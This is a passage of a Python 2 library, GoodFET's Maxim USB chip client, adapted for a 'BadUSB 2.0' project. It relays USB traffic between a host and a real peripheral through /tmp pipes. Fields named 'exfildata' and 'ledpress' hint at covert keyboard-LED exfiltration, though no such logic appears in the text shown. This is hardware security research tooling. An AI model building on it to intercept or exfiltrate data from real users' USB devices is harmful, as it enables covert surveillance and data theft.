#!/usr/bin/env python
# GoodFET Client Library for Maxim USB Chips.
# 
# (C) 2012 Travis Goodspeed <travis at radiantmachines.com>
#
# This code is being rewritten and refactored.  You've been warned!
#
# Code modified as part of BadUSB 2.0 Project
# by DK 2016 (@withdk)

import sys, time, string, cStringIO, struct, glob, os;
import warnings

from GoodFET import GoodFET;

#Handy registers.
rEP0FIFO=0
rEP1OUTFIFO=1
rEP2INFIFO=2
rEP3INFIFO=3
rSUDFIFO=4
rEP0BC=5
rEP1OUTBC=6
rEP2INBC=7
rEP3INBC=8
rEPSTALLS=9
rCLRTOGS=10
rEPIRQ=11
rEPIEN=12
rUSBIRQ=13
rUSBIEN=14
rUSBCTL=15
rCPUCTL=16
rPINCTL=17
rREVISION=18
rFNADDR=19
rIOPINS=20
rIOPINS1=20  #Same as rIOPINS
rIOPINS2=21
rHIRQ=25
rHIEN=26
rMODE=27
rPERADDR=28
rHCTL=29
rHXFR=30
rHRSL=31

#Host mode registers.
rRCVFIFO =1
rSNDFIFO =2
rRCVBC   =6
rSNDBC   =7
rHIRQ    =25


# R11 EPIRQ register bits
bmSUDAVIRQ =0x20
bmIN3BAVIRQ =0x10
bmIN2BAVIRQ =0x08
bmOUT1DAVIRQ= 0x04
bmOUT0DAVIRQ= 0x02
bmIN0BAVIRQ =0x01

# R12 EPIEN register bits
bmSUDAVIE   =0x20
bmIN3BAVIE  =0x10
bmIN2BAVIE  =0x08
bmOUT1DAVIE =0x04
bmOUT0DAVIE =0x02
bmIN0BAVIE  =0x01




# ************************
# Standard USB Requests
SR_GET_STATUS		=0x00	# Get Status
SR_CLEAR_FEATURE	=0x01	# Clear Feature
SR_RESERVED		=0x02	# Reserved
SR_SET_FEATURE		=0x03	# Set Feature
SR_SET_ADDRESS		=0x05	# Set Address
SR_GET_DESCRIPTOR	=0x06	# Get Descriptor
SR_SET_DESCRIPTOR	=0x07	# Set Descriptor
SR_GET_CONFIGURATION	=0x08	# Get Configuration
SR_SET_CONFIGURATION	=0x09	# Set Configuration
SR_GET_INTERFACE	=0x0a	# Get Interface
SR_SET_INTERFACE	=0x0b	# Set Interface

# Get Descriptor codes	
GD_DEVICE		=0x01	# Get device descriptor: Device
GD_CONFIGURATION	=0x02	# Get device descriptor: Configuration
GD_STRING		=0x03	# Get device descriptor: String
GD_HID	            	=0x21	# Get descriptor: HID
GD_REPORT	        =0x22	# Get descriptor: Report
HID_REPORT		=0x01	# HID Report (Get Report)

# SETUP packet header offsets
bmRequestType           =0
bRequest       	        =1
wValueL			=2
wValueH			=3
wIndexL			=4
wIndexH			=5
wLengthL		=6
wLengthH		=7

# HID bRequest values
GET_REPORT		=1
GET_IDLE		=2
GET_PROTOCOL            =3
SET_REPORT		=9
SET_IDLE		=0x0A
SET_PROTOCOL            =0x0B
INPUT_REPORT            =1

# PINCTL bits
bmEP3INAK   =0x80
bmEP2INAK   =0x40
bmEP1INAK   =0x20
bmFDUPSPI   =0x10
bmINTLEVEL  =0x08
bmPOSINT    =0x04
bmGPXB      =0x02
bmGPXA      =0x01

# rUSBCTL bits
bmHOSCSTEN  =0x80
bmVBGATE    =0x40
bmCHIPRES   =0x20
bmPWRDOWN   =0x10
bmCONNECT   =0x08
bmSIGRWU    =0x04

# USBIRQ bits
bmURESDNIRQ =0x80
bmVBUSIRQ   =0x40
bmNOVBUSIRQ =0x20
bmSUSPIRQ   =0x10
bmURESIRQ   =0x08
bmBUSACTIRQ =0x04
bmRWUDNIRQ  =0x02
bmOSCOKIRQ  =0x01

# MODE bits
bmHOST          =0x01
bmLOWSPEED      =0x02
bmHUBPRE        =0x04
bmSOFKAENAB     =0x08
bmSEPIRQ        =0x10
bmDELAYISO      =0x20
bmDMPULLDN      =0x40
bmDPPULLDN      =0x80

# PERADDR/HCTL bits
bmBUSRST        =0x01
bmFRMRST        =0x02
bmSAMPLEBUS     =0x04
bmSIGRSM        =0x08
bmRCVTOG0       =0x10
bmRCVTOG1       =0x20
bmSNDTOG0       =0x40
bmSNDTOG1       =0x80

# rHXFR bits
# Host XFR token values for writing the HXFR register (R30).
# OR this bit field with the endpoint number in bits 3:0
tokSETUP  =0x10  # HS=0, ISO=0, OUTNIN=0, SETUP=1
tokIN     =0x00  # HS=0, ISO=0, OUTNIN=0, SETUP=0
tokOUT    =0x20  # HS=0, ISO=0, OUTNIN=1, SETUP=0
tokINHS   =0x80  # HS=1, ISO=0, OUTNIN=0, SETUP=0
tokOUTHS  =0xA0  # HS=1, ISO=0, OUTNIN=1, SETUP=0 
tokISOIN  =0x40  # HS=0, ISO=1, OUTNIN=0, SETUP=0
tokISOOUT =0x60  # HS=0, ISO=1, OUTNIN=1, SETUP=0

# rRSL bits
bmRCVTOGRD   =0x10
bmSNDTOGRD   =0x20
bmKSTATUS    =0x40
bmJSTATUS    =0x80
# Host error result codes, the 4 LSB's in the HRSL register.
hrSUCCESS   =0x00
hrBUSY      =0x01
hrBADREQ    =0x02
hrUNDEF     =0x03
hrNAK       =0x04
hrSTALL     =0x05
hrTOGERR    =0x06
hrWRONGPID  =0x07
hrBADBC     =0x08
hrPIDERR    =0x09
hrPKTERR    =0x0A
hrCRCERR    =0x0B
hrKERR      =0x0C
hrJERR      =0x0D
hrTIMEOUT   =0x0E
hrBABBLE    =0x0F

# HIRQ bits
bmBUSEVENTIRQ   =0x01   # indicates BUS Reset Done or BUS Resume     
bmRWUIRQ        =0x02
bmRCVDAVIRQ     =0x04
bmSNDBAVIRQ     =0x08
bmSUSDNIRQ      =0x10
bmCONDETIRQ     =0x20
bmFRAMEIRQ      =0x40
bmHXFRDNIRQ     =0x80

class GoodFETMAXUSB(GoodFET):
    MAXUSBAPP=0x40;
    CAPSLOCK=2;
    SCROLLLOCK=4;
    NUMLOCK=1;
    usbverbose=False;
    ep0_p2hdata=[]; # Data sent from peripheral to host (EP0)
    ep0_h2pdata=[]; # Data sent from host to peripheral (EP0)
    ep3_p2hdata=[]; # Data sent from peripheral to host (EP3)
    ep3_h2pdata=[]; # Data sent from host to peripheral (EP3)
    rpipe_complete=0;
    int_ready=0;
    recdata=[];
    recstatus=False;
    lastreport=0;
    ledpress=0;
    ledstarted=0;
    exfildata='';
    exfiltmp='';
    lastled=0;
    curled=0;
    
    
    
    def service_irqs(self):
        """Handle USB interrupt events."""
        epirq=self.rreg(rEPIRQ);
        usbirq=self.rreg(rUSBIRQ);
        write_h2p_ep0 = "/tmp/write_h2p_ep0"
        read_p2h_ep3 = "/tmp/write_p2h_ep3";
        
        # We don't use IRQs as it causes headaches with pipes
        #self.m2h();
        #self.do_IN3();
        
        #Are we being asked for setup data?
        if(epirq&bmSUDAVIRQ): #Setup Data Requested
            self.wreg(rEPIRQ,bmSUDAVIRQ); #Clear the bit
            #self.do_SETUP();
            # DK Note: Function that does setup.
            #print("setup now");
            self.m2h();
        else:
            # HACK TODO: Prevent non-blocking of pipes
            wd = open(write_h2p_ep0, "w");
            no_h2pdatastr="00000000";
	    #print("writing %d" % len(no_h2pdatastr));
	    wd.write(no_h2pdatastr); # prevent blocking
            wd.flush();
            wd.close();
        if(epirq&bmOUT1DAVIRQ): #OUT1-OUT packet
	    #print("OUT now");
            #self.do_OUT1();
            self.wreg(rEPIRQ,bmOUT1DAVIRQ); #Clear the bit *AFTER* servicing.
        if(epirq&bmIN3BAVIRQ): #IN3-IN packet
	    self.wreg(rEPIRQ,bmIN3BAVIRQ); #Clear the bit
	  # DK Note: Function that performs INTs (typing)
	    #print("IN3 now");
            self.do_IN3();
        else:
	    # Prevent blocking of pipes
	    self.do_IN3();
        if(epirq&bmIN2BAVIRQ): #IN2 packet
            self.do_IN2();
            #self.wreg(rEPIRQ,bmIN2BAVIRQ); #Clear the bit
        #else:
        #    print "No idea how to service this IRQ: %02x" % epirq;
    def do_IN2(self):
        """Overload this."""
        #print("We got an event on EP2");
    #def do_IN3(self):
        """Overload this."""
        #self.type_IN3();
        #some_var=self.readbytes(rEP3INBC,8);
        #if(len(some_var)>6):
            #print("We got an event on EP3");
    def do_OUT1(self):
        """Overload this."""
        if self.usbverbose: print "Ignoring an OUT1 interrupt.";
    def setup2str(self,SUD):
        """Converts the header of a setup packet to a string."""
        return "bmRequestType=0x%02x, bRequest=0x%02x, wValue=0x%04x, wIndex=0x%04x, wLength=0x%04x" % (
                ord(SUD[0]), ord(SUD[1]),
                ord(SUD[2])+(ord(SUD[3])<<8),
                ord(SUD[4])+(ord(SUD[5])<<8),
                ord(SUD[6])+(ord(SUD[7])<<8)
                );
    
    def MAXUSBsetup(self):
        """Move the FET into the MAXUSB application."""
        self.writecmd(self.MAXUSBAPP,0x10,0,self.data); #MAXUSB/SETUP
        self.writecmd(self.MAXUSBAPP,0x10,0,self.data); #MAXUSB/SETUP
        self.writecmd(self.MAXUSBAPP,0x10,0,self.data); #MAXUSB/SETUP
        print "Connected to MAX342x Rev. %x" % (self.rreg(rREVISION));
        self.wreg(rPINCTL,0x18); #Set duplex and negative INT level.
        
    def MAXUSBtrans8(self,byte):
        """Read and write 8 bits by MAXUSB."""
        data=self.MAXUSBtrans([byte]);
        return ord(data[0]);
    
    def MAXUSBtrans(self,data):
        """Exchange data by MAXUSB."""
        self.data=data;
        self.writecmd(self.MAXUSBAPP,0x00,len(data),data);
        return self.data;

    def rreg(self,reg):
        """Peek 8 bits from a register."""
        data=[reg<<3,0];
        self.writecmd(self.MAXUSBAPP,0x00,len(data),data);
        return ord(self.data[1]);
    def rregAS(self,reg):
        """Peek 8 bits from a register, setting AS."""
        data=[(reg<<3)|1,0];
        self.writecmd(self.MAXUSBAPP,0x00,len(data),data);
        return ord(self.data[1]);
    def wreg(self,reg,value):
        """Poke 8 bits into a register."""
        data=[(reg<<3)|2,value];
        self.writecmd(self.MAXUSBAPP,0x00,len(data),data);        
        return value;
    def wregAS(self,reg,value):
        """Poke 8 bits into a register, setting AS."""
        data=[(reg<<3)|3,value];
        self.writecmd(self.MAXUSBAPP,0x00,len(data),data);        
        return value;
    def readbytes(self,reg,length):
        """Peek some bytes from a register."""
        data=[(reg<<3)]+range(0,length);
        self.writecmd(self.MAXUSBAPP,0x00,len(data),data);
        toret=self.data[1:len(self.data)];
        ashex="";
        for foo in toret:
            ashex=ashex+(" %02x"%ord(foo));
        if self.usbverbose: print "GET   %02x==%s" % (reg,ashex);
        return toret;
    def readbytesAS(self,reg,length):
        """Peek some bytes from a register, acking prior transfer."""
        data=[(reg<<3)|1]+range(0,length);
        self.writecmd(self.MAXUSBAPP,0x00,len(data),data);
        toret=self.data[1:len(self.data)];
        ashex="";
        for foo in toret:
            ashex=ashex+(" %02x"%ord(foo));
        if self.usbverbose: print "GETAS %02x==%s" % (reg,ashex);
        return toret;
    def fifo_ep3in_tx(self,data):
        """Sends the data out of EP3 in 64-byte chunks."""
        #Wait for the buffer to be free before starting.
        while not(self.rreg(rEPIRQ)&bmIN3BAVIRQ): pass;
        
        count=len(data);
        pos=0;
        while count>0:
            #Send 64-byte chunks or the remainder.
            c=min(count,64);
            self.writebytes(rEP3INFIFO,
                            data[pos:pos+c]);
            self.wregAS(rEP3INBC,c);
            count=count-c;
            pos=pos+c;
            
            #Wait for the buffer to be free before continuing.
            while not(self.rreg(rEPIRQ)&bmIN3BAVIRQ): pass;
            
        return;
        
    def ctl_write_nd(self,request):
        """Control Write with no data stage.  Assumes PERADDR is set
        and the SUDFIFO contains the 8 setup bytes.  Returns with
        result code = HRSLT[3:0] (HRSL register).  If there is an
        error, the 4MSBits of the returned value indicate the stage 1
        or 2."""
        
        # 1. Send the SETUP token and 8 setup bytes. 
        # Should ACK immediately.
        self.writebytes(rSUDFIFO,request);
        resultcode=self.send_packet(tokSETUP,0); #SETUP packet to EP0.
        if resultcode: return resultcode;
        
        # 2. No data stage, so the last operation is to send an IN
        # token to the peripheral as the STATUS (handhsake) stage of
        # this control transfer.  We should get NAK or the DATA1 PID.
        # When we get back to the DATA1 PID the 3421 automatically
        # sends the closing NAK.
        resultcode=self.send_packet(tokINHS,0); #Function takes care of retries.
        if resultcode: return resultcode;
        
        return 0;
        
    def ctl_read_ep0(self, request):
        """Control read transfer, used in Host mode."""
        resultcode=0;  
        if(len(request)==8):
            bytes_to_read=request[6]+256*request[7];
        else:
	    print("Unhandled in ctl_read");
	    bytes_to_read=0;
	#bytes_to_read=request[6]+256*request[7]
             ##SETUP packet
        self.writebytes(rSUDFIFO,request);     #Load the FIFO
        resultcode=self.send_packet(tokSETUP,0); #SETUP packet to EP0
        if resultcode:
            print "Failed to get ACK on SETUP request in ctl_read()."
            return resultcode;
        
        self.wreg(rHCTL,bmRCVTOG1);              #FIRST data packet in CTL transfer uses DATA1 toggle.
        resultcode=self.IN_Transfer(0,bytes_to_read);
        if resultcode:
            print "Failed on IN Transfer in ctl_read()";
            return resultcode;
        
        self.IN_nak_count=self.nak_count;
        
        #The OUT status stage.
        resultcode=self.send_packet(0x00,0);
        if resultcode:
            print "Failed on OUT Status stage in ctl_read()";
            return resultcode;
        
        return 0; #Success
        
        #The OUT status stage.
        resultcode=self.send_packet(0x00,0);
        if resultcode:
            print "Failed on OUT Status stage in ctl_read()";
            return resultcode;
        
        return 0; #Success        
    def ctl_read(self,request):
        """Control read transfer, used in Host mode."""
        resultcode=0;  
        if(len(request)==8):
            bytes_to_read=request[6]+256*request[7];
        else:
	    print("Unhandled in ctl_read");
	    bytes_to_read=0;
	#bytes_to_read=request[6]+256*request[7];
	
        ##SETUP packet
        self.writebytes(rSUDFIFO,request);     #Load the FIFO
        resultcode=self.send_packet(tokSETUP,0); #SETUP packet to EP0
        if resultcode:
            print "Failed to get ACK on SETUP request in ctl_read()."
            return resultcode;
        
        self.wreg(rHCTL,bmRCVTOG1);              #FIRST data packet in CTL transfer uses DATA1 toggle.
        resultcode=self.IN_Transfer(0,bytes_to_read);
        if resultcode:
            print "Failed on IN Transfer in ctl_read()";
            return resultcode;
        
        self.IN_nak_count=self.nak_count;
        
        #The OUT status stage.
        resultcode=self.send_packet(tokOUTHS,0);
        if resultcode:
            print "Failed on OUT Status stage in ctl_read()";
            return resultcode;
        
        return 0; #Success
        # endpoint will be the requested one, in this case 2 by kingston
        
    def OUT_Transfer(self,endpoint,data): 
      # check length, etc
      count = len(data)
      pos = 0
      while count > 0:
        while not (self.rreg(rHIRQ) & bmSNDBAVIRQ):
          print("waiting for SND buffer")
        # wait for SND irq to be ready
          pass

        c = min(count,64)
        self.writebytes(rSNDFIFO,data[pos:pos+c]);     #Load the FIFO
        self.writebytes(rSNDBC, [c])
        count = count - c

        print("Hitting tokOUT to endpoint %d" % endpoint) # TODO add verbose
        #resultcode = self.send_packet(tokOUT,endpoint) # will take care of NAKs and retries
        resultcode = self.send_packet(tokOUT,endpoint) # will take care of NAKs and retries
        if resultcode: print("Error in OUT transfer: %d" % resultcode)

    RETRY_LIMIT=1; #normally 3
    NAK_LIMIT=1; #normally 300
    
    def IN_Transfer_Int(self,endpoint,INbytes):
        """Does an IN transfer to an endpoint, used for Host mode."""
        xfrsize=INbytes;
        xfrlen=0;
        self.ep3_p2hdata=[];
        
        
        while 1:
            resultcode=self.send_packet(tokIN,endpoint); #IN packet to EP. NAKS taken care of.
            if resultcode: return resultcode;
            
            pktsize=self.rreg(rRCVBC); #Numer of RXed bytes.
            
            #Very innefficient, move this to C if performance is needed.
            for j in range(0,pktsize):
                self.ep3_p2hdata=self.ep3_p2hdata+[self.rreg(rRCVFIFO)];
            #xfrsize=self.p2hdata[0];
            self.wreg(rHIRQ,bmRCVDAVIRQ); #Clear IRQ
            xfrlen=xfrlen+pktsize; #Add byte count to total transfer length.
            
            #print "%i / %i" % (xfrlen,xfrsize)
            #print("getting here %d" % xfrlen)
            #Packet is complete if:
            # 1. The device sent a short packet, <maxPacketSize
            # 2. INbytes have been transfered.
            if (pktsize<self.maxPacketSize) or (xfrlen>=xfrsize):
                self.last_transfer_size=xfrlen;
                ashex="";
                for foo in self.ep3_p2hdata:
                    ashex=ashex+(" %02x"%foo);
                #print "INPACKET EP%i==%s (0x%02x bytes remain)" % (endpoint,ashex,xfrsize);
                return resultcode;

    RETRY_LIMIT=3;
    NAK_LIMIT=300;
    
    def IN_Transfer(self,endpoint,INbytes):
        """Does an IN transfer to an endpoint, used for Host mode."""
        xfrsize=INbytes;
        xfrlen=0;
        self.ep0_p2hdata=[];
        
        
        while 1:
            resultcode=self.send_packet(tokIN,endpoint); #IN packet to EP. NAKS taken care of.
            if resultcode: return resultcode;
            
            pktsize=self.rreg(rRCVBC); #Numer of RXed bytes.
            
            #Very innefficient, move this to C if performance is needed.
            for j in range(0,pktsize):
                self.ep0_p2hdata=self.ep0_p2hdata+[self.rreg(rRCVFIFO)];
            #xfrsize=self.p2hdata[0];
            self.wreg(rHIRQ,bmRCVDAVIRQ); #Clear IRQ
            xfrlen=xfrlen+pktsize; #Add byte count to total transfer length.
            
            #print "%i / %i" % (xfrlen,xfrsize)
            #print("getting here %d" % xfrlen)
            #Packet is complete if:
            # 1. The device sent a short packet, <maxPacketSize
            # 2. INbytes have been transfered.
            if (pktsize<self.maxPacketSize) or (xfrlen>=xfrsize):
                self.last_transfer_size=xfrlen;
                ashex="";
                for foo in self.ep0_p2hdata:
                    ashex=ashex+(" %02x"%foo);
                #print "INPACKET EP%i==%s (0x%02x bytes remain)" % (endpoint,ashex,xfrsize);
                return resultcode;

    RETRY_LIMIT=3;
    NAK_LIMIT=300;
    def send_packet(self,token,endpoint):
        """Send a packet to an endpoint as the Host, taking care of NAKs.
        Don't use this for device code."""
        self.retry_count=0;
        self.nak_count=0;
        
        #Repeat until NAK_LIMIT or RETRY_LIMIT is reached.
        while self.nak_count<self.NAK_LIMIT and self.retry_count<self.RETRY_LIMIT:
            self.wreg(rHXFR,(token|endpoint)); #launch the transfer
            while not (self.rreg(rHIRQ) & bmHXFRDNIRQ):
                # wait for the completion IRQ
                pass;
            self.wreg(rHIRQ,bmHXFRDNIRQ);           #Clear IRQ
            resultcode = (self.rreg(rHRSL) & 0x0F); # get the result
            if (resultcode==hrNAK):
                self.nak_count=self.nak_count+1;
            elif (resultcode==hrTIMEOUT):
                self.retry_count=self.retry_count+1;
            else:
                #Success!
                return resultcode;
        return resultcode;
            
    def writebytes(self,reg,tosend):
        """Poke some bytes into a register."""
        data="";
        if type(tosend)==str:
            data=chr((reg<<3)|3)+tosend;
            if self.usbverbose: print "PUT %02x:=%s (0x%02x bytes)" % (reg,tosend,len(data))
        else:
            data=[(reg<<3)|3]+tosend;
            ashex="";
            for foo in tosend:
                ashex=ashex+(" %02x"%foo);
            if self.usbverbose: print "PUT %02x:=%s (0x%02x bytes)" % (reg,ashex,len(data))
        self.writecmd(self.MAXUSBAPP,0x00,len(data),data);
    def usb_connect(self):
        """Connect the USB port."""
        
        #disconnect D+ pullup if host turns off VBUS
        self.wreg(rUSBCTL,bmVBGATE|bmCONNECT);
    def usb_disconnect(self):
        """Disconnect the USB port."""
        self.wreg(rUSBCTL,bmVBGATE);
    def STALL_EP0(self,SUD=None):
        """Stall for an unknown SETUP event."""
        if SUD==None:
            print "Stalling EP0.";
        else:
            print "Stalling EPO for %s" % self.setup2str(SUD);
        # No lets ignore this!! :)
        # self.wreg(rEPSTALLS,0x23); #All three stall bits.
    def SETBIT(self,reg,val):
        """Set a bit in a register."""
        self.wreg(reg,self.rreg(reg)|val);
    def vbus_on(self):
        """Turn on the target device."""
        self.wreg(rIOPINS2,(self.rreg(rIOPINS2)|0x08));
    def vbus_off(self):
        """Turn off the target device's power."""
        self.wreg(rIOPINS2,0x00);
    def reset_host(self):
        """Resets the chip into host mode."""
        self.wreg(rUSBCTL,bmCHIPRES); #Stop the oscillator.
        self.wreg(rUSBCTL,0x00);      #restart it.
        
        #FIXME: Why does the OSC line never settle?
        #Code works without it.
        
        #print "Waiting for PLL to sabilize.";
        #while self.rreg(rUSBIRQ)&bmOSCOKIRQ:
        #    #Hang until the PLL stabilizes.
        #    pass;
        #print "Stable.";

class GoodFETMAXUSBHost(GoodFETMAXUSB):
    """This is a class for implemented a minimal USB host.
    It's intended for fuzzing, rather than for daily use."""
    
#
# Return request type after using h2p_host_request_type() function.
#
    h2p_msg_types={
      -1:"Error, Invalid Length",
      0:"No Match",
      1:"Get Descriptor Device",
      2:"Get Descriptor Configuration",
      3:"Get Descriptor String",
      4:"Get Descriptor Device Qualifier",
      5:"Get Status",
      6:"Get Descriptor RPIPE",
      7:"Get Report",
      8:"Set Address",
      9:"Set Configuration Address",
      10:"Set Feature (Port Reset)",
      11:"Clear Feature (Port Reset)",
      12:"Set Idle",
      13:"Set Report",
    }
    
    def hostinit(self):
        """Initialize the MAX3421 as a USB Host."""
        self.usb_connect();
        print "Enabling host mode.";
        self.wreg(rPINCTL,(bmFDUPSPI|bmPOSINT));
        print "Resetting host.";
        self.reset_host();
        self.vbus_off();
        time.sleep(0.2);
        print "Powering host.";
        self.vbus_on();
        
        #self.hostrun();

    def hostrun(self):
        """Run as a minimal host and dump the config tables."""
        
        while True:
            self.detect_device();
            time.sleep(0.2);
            self.m2p();
            self.wait_for_disconnect();
            
    def detect_device(self):
        """Waits for a device to be inserted and then returns."""
        busstate=0;
        
        #Activate host mode and turn on 15K pulldown resistors on D+ and D-.
        self.wreg(rMODE,(bmDPPULLDN|bmDMPULLDN|bmHOST));
        #Clear connection detect IRQ.
        self.wreg(rHIRQ,bmCONDETIRQ);
        
        print "Waiting for a device connection.";
        while busstate==0:
            self.wreg(rHCTL,bmSAMPLEBUS); #Update JSTATUS and KSTATUS bits.
            busstate=self.rreg(rHRSL) & (bmJSTATUS|bmKSTATUS);
            
        if busstate==bmJSTATUS:
            print "Detected Full-Speed Device.";
            self.wreg(rMODE,(bmDPPULLDN|bmDMPULLDN|bmHOST|bmSOFKAENAB));
        elif busstate==bmKSTATUS:
            print "Detected Low-Speed Device.";
            self.wreg(rMODE,(bmDPPULLDN|bmDMPULLDN|bmHOST|bmLOWSPEED|bmSOFKAENAB));
        else:
            print "Not sure whether this is Full-Speed or Low-Speed.  Please investigate.";
    def wait_for_disconnect(self):
        """Wait for a device to be disconnected."""
        print "Waiting for a device disconnect.";
        
        self.wreg(rHIRQ,bmCONDETIRQ); #Clear disconnect IRQ
        while not (self.rreg(rHIRQ) & bmCONDETIRQ):
            #Wait for IRQ to change.
            pass;
        
        #Turn off markers.
        self.wreg(rMODE,bmDPPULLDN|bmDMPULLDN|bmHOST);
        print "Device disconnected.";
        self.wreg(rIOPINS2,(self.rreg(rIOPINS2) & ~0x04)); #HL1_OFF
        self.wreg(rIOPINS1,(self.rreg(rIOPINS1) & ~0x02)); #HL4_OFF      
#
# These values were taken from a Wireshark packet capture
#
    def h2p_host_request_type(self, msg):
        """Return the type of usb request sent from the host to the peripheral."""
        msg_type=0
        #print(msg)
        # Get Descriptor Device
        if(msg[0]==0x80 and msg[3]==0x01):
          msg_type=1
        # Get Descriptor Configuration
        if(msg[0]==0x80 and msg[3]==0x02):
          msg_type=2
        # Get Descriptor String
        if(msg[0]==0x80 and msg[3]==0x03):
          msg_type=3
        # Get Descriptor Device Qualifier
        if(msg[0]==0x80 and msg[3]==0x06):
          msg_type=4
        # Get Status
        if(msg[0]==0xa3 and msg[1]==0x00):
          msg_type=5
        # Get Descriptor RPIPE
        if(msg[0]==0x81 and msg[3]==0x22):
          msg_type=6
        # Get Report
        if(msg[0]==0xa1 and msg[1]==0x01):
          msg_type=7
        # Set Address
        if(msg[0]==0x00 and msg[1]==0x05):
          msg_type=8
        # Set Configuration Address
        if(msg[0]==0x00 and msg[1]==0x09):
          msg_type=9
        # Set Feature (Port Reset)
        if(msg[0]==0x23 and msg[1]==0x03):
          msg_type=10
        # Clear Feature (Port Reset)
        if(msg[0]==0x23 and msg[1]==0x01):
          msg_type=11
        # Set Idle
        if(msg[0]==0x21 and msg[1]==0x0a):
          msg_type=12
        # Set Report 
        if(msg[0]==0x21 and msg[1]==0x09):
          msg_type=13
        return(msg_type)

      
    def m2p(self):
        """Enumerates a device on the present port."""
        read_h2p_ep0 = "/tmp/write_h2p_ep0"
        write_p2h_ep0 = "/tmp/write_p2h_ep0"
        gd_counter=0;
        
        while True:
            #Get data from host to send to peripheral
            #rd = open(read_h2p_ep0, "r");
            #self.h2pdata=rd.readline();
            #rd.close();
            self.p2hdata=[];
            self.ep0_h2pdata=[];
            
            rd = open(read_h2p_ep0, "r");
            self.ep0_h2pdata=rd.read(8);
            rd.flush();
            rd.close();
            
            # DK get the message type
            msg_type=0;
            if(len(self.ep0_h2pdata)>2):
               msg_data=self.ep0_h2pdata;
               msg_data=[ord(self.ep0_h2pdata[0]), ord(self.ep0_h2pdata[1]), ord(self.ep0_h2pdata[2]), ord(self.ep0_h2pdata[3])]
               msg_type=self.h2p_host_request_type(msg_data);
               #if(msg_type!="No Match"): # HACK for less debug info
               print("H2P Message Type: %s" % self.h2p_msg_types[msg_type]);
               msg_to_str=', '.join(str(ord(c)) for c in self.ep0_h2pdata)
               # Uncomment for debugging
               if(msg_to_str!="48, 48, 48, 48, 48, 48, 48, 48"): # HACK for less debug info.
                   print("H2P: %s" % msg_to_str);
            
            # DK If a setup packet we reset the bus
            if(msg_type==0): # No match
	        self.m2p_int();
	        #wd = open(write_p2h_ep0, "w");
                #wd.write(str(list(self.p2hdata))+'\n');
                #wd.write('');
                #wd.flush();
                #wd.close();
	        continue;
            if(msg_type==1): # Get_Descriptor	       
	       if gd_counter==0:
                  print "Issuing USB bus reset.";
                  self.wreg(rHCTL,bmBUSRST);
                  while self.rreg(rHCTL) & bmBUSRST:
                     #Wait for reset to complete.
                     pass;
	          time.sleep(0.2);
                  self.wreg(rPERADDR,0); #First request to address 0.
                  
               self.maxPacketSize=8; #Only safe value for first check.
        
               print "Fetching 8 bytes of Device Descriptor.";
               self.ctl_read(self.ep0_h2pdata); # Get device descriptor into self.p2hdata
               #print "EP0 maxPacketSize is %02i bytes." % self.maxPacketSize;
               # Send p2hdata to host
               # uncomment for debugging
               # print("P2H: %s" % self.ep0_p2hdata);
               wd = open(write_p2h_ep0, "w");
               wd.write(str(list(self.ep0_p2hdata))+'\n');
               wd.close();
               #req_type=self.h2p_host_request_type(self.ep0_p2hdata);
        
               # Issue another USB bus reset
               if gd_counter==0:
                  print "Resetting the bus again."
                  self.wreg(rHCTL,bmBUSRST);
                  while self.rreg(rHCTL) & bmBUSRST:
                     #Wait for reset to complete.
                     pass;
                  time.sleep(0.2);
                  
               if gd_counter==1:
                   self.descriptor=self.ep0_p2hdata;
                   self.VID 	= self.ep0_p2hdata[8] + 256*self.ep0_p2hdata[9];
                   self.PID 	= self.ep0_p2hdata[10]+ 256*self.ep0_p2hdata[11];
                   iMFG 	= self.ep0_p2hdata[14];
                   iPROD 	= self.ep0_p2hdata[15];
                   iSERIAL	= self.ep0_p2hdata[16];
        
                   self.manufacturer=self.getDescriptorString(iMFG);
                   self.product=self.getDescriptorString(iPROD);
                   self.serial=self.getDescriptorString(iSERIAL);
                   self.printstrings();
               gd_counter=gd_counter+1;
            elif(msg_type==8): # Set Address
               #HR = self.ctl_write_nd(Set_Address_to_13);   # CTL-Write, no data stage
               HR=self.ctl_write_nd(self.ep0_h2pdata);
               time.sleep(0.002);           # Device gets 2 msec recovery time
               print(ord(self.ep0_h2pdata[2]));
               self.wreg(rPERADDR,ord(self.ep0_h2pdata[2]));       # now all transfers go to addr 7
               wd = open(write_p2h_ep0, "w");
               #wd.write(str(list(self.p2hdata))+'\n');
               wd.write('');
               wd.close();
               #req_type=self.h2p_host_request_type(self.ep0_p2hdata);
            elif(msg_type==9 or msg_type==12): # Set Configuration && Set Address
	       #self.ctl_read(self.h2pdata); # Get device descriptor into self.p2hdata
               HR = self.ctl_write_nd(self.ep0_h2pdata);
               time.sleep(0.002);           # Device gets 2 msec recovery time
               # Send p2hdata to host
               self.ep0_p2hdata=[];
               print("P2H: %s" % self.ep0_p2hdata);
               wd = open(write_p2h_ep0, "w");
               wd.write('');
               wd.close();
               if(msg_type==9):
		   print("Device now CONFIGURED");
		   #while True:
                       #self.IN_Transfer_Int(1,8);
                       #print("Got INT data: %s" % self.intdata);
                       # Send EP0 Complete Message
                       #wd = open(write_p2h_ep0, "w"); # Need a new endpoint.
                       #wd.write(1337 + '\n');
                       #wd.close();
		   #while True:
		       #self.service_irqs();
                   #print("Sending numlock test");
                   #numlock_int=[0x00,0x00,0x53,0x00,0x00,0x00,0x00,0x00];
                   #self.ctl_read(numlock_int);
                   #numlock_set_report=[0x21,0x09,0x00,0x02,0x00,0x00,0x01,0x00]
                   #HR=self.ctl_write_nd(numlock_set_report);
                   #print(HR);
            elif(msg_type==13): # Set Report
               # Only do this once till we figure it OUT, means no LEDs on keyboard, even though it activates.
               # DK: Disabled as it would stall EP0 TODO
               # We also need it working so we can transfer OUT data.
	       # HR=self.ctl_write_nd(self.ep0_h2pdata);
	       wd = open(write_p2h_ep0, "w");
               wd.write('');
               wd.flush();
               wd.close();
               #req_type=self.h2p_host_request_type(self.ep0_p2hdata);
               #time.sleep(0.002);           # Device gets 2 msec recovery time
            elif(msg_type==6): # RPIPE
	       self.ctl_read(self.ep0_h2pdata); # Get device descriptor into self.p2hdata
               #time.sleep(0.002);           # Device gets 2 msec recovery time
               # Send p2hdata to host
               print("P2H: %s" % self.ep0_p2hdata);
               wd = open(write_p2h_ep0, "w");
               if(len(self.ep0_p2hdata)>0):	   
		   wd.write(str(list(self.ep0_p2hdata))+'\n');             
               else:
                   wd.write('');
               wd.flush();
               wd.close();
            elif(msg_type==7): # Get Report
	       self.ctl_read(self.ep0_h2pdata);
	       print("P2H: %s" % self.ep0_p2hdata);
	       wd = open(write_p2h_ep0, "w");
	       if(len(self.ep0_p2hdata)>0):	   
